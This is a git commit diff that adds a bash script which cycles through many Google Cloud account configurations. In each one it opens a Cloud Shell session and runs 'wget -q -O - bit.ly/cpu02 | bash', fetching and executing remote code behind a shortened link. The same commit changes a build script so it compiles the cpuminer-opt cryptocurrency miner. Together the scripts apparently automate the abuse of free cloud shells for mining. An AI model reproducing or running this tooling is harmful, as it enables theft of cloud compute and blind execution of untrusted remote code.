f54c6896003cfda1b219778027987d3072e7e1db
one10001 <10001.one.10001@gmail.com>
2021-07-02 18:43:52 +0100

    cpuopt

---
+++ autoscript/gshellrun.sh
@@ -0,0 +1,53 @@
+#!/bin/bash -xe
+logfile=/tmp/gshellrun.log
+errlogfile=/tmp/gshellrun.log
+echo > $logfile
+
+all=$(cat $1 | wc -l)
+block=$[$all/3]
+
+while true
+do
+i=0
+    
+
+    awk "NR >= 1 && NR <= $[$block * 1] " $1| while read gid 
+    do
+    
+        echo "Block 1 :"
+        docker run --rm --volumes-from gcloud-config-${gid} gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/cpu02 | bash' 1>> $logfile 2>> $errlogfile &
+        echo gid $i: ${gid} 
+        i=$[$i+1]
+        sleep 5
+    done
+    sleep 1080
+
+    awk "NR >= $[$block * 1 + 1] && NR <= $[$block * 2] " $1| while read gid 
+    do
+    
+        echo "Block 2 :"
+        docker run --rm --volumes-from gcloud-config-${gid} gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/cpu02 | bash' 1>> $logfile 2>> $errlogfile &
+        echo gid $i: ${gid} 
+        i=$[$i+1]
+        sleep 5
+    done
+    sleep 1080
+
+    awk "NR >= $[ $block * 2 + 1] " $1| while read gid 
+    do
+        echo "Block 3 :"
+        docker run --rm --volumes-from gcloud-config-${gid} gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/cpu02 | bash' 1>> $logfile 2>> $errlogfile &
+        echo gid $i: ${gid} 
+        i=$[$i+1]
+        sleep 5
+    done
+    sleep 1080
+    
+    echo reloop wait 1 min
+    
+    
+    
+
+sleep 60
+
+done
--- rv2.sh
+++ rv2.sh
@@ -1,10 +1,28 @@
 #!/bin/bash
 mkdir -p /tmp/b
 cd /tmp/b
-sudo apt-get install git build-essential cmake automake libtool autoconf libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
-git clone --single-branch -b linux https://github.com/tpruvot/ccminer.git
-cd ccminer
-./build.sh
+sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++ lib32z1-dev build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git git build-essential cmake automake libtool autoconf libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
+
+
+echo '###################################################################'
+echo '###################################################################'
+echo '############################ cpuopt #################################'
+echo '###################################################################'
+echo '###################################################################'
+
+git clone https://github.com/JayDDee/cpuminer-opt.git
+cd cpuminer-opt
+./build-allarch.sh 
+
+
+echo '###################################################################'
+echo '###################################################################'
+echo '############################ CCm #################################'
+echo '###################################################################'
+echo '###################################################################'
+#git clone --single-branch -b linux https://github.com/tpruvot/ccminer.git
+#cd ccminer
+#./build.sh
 echo '###################################################################'
 echo '###################################################################'
 echo '############################ xmCPU #################################'
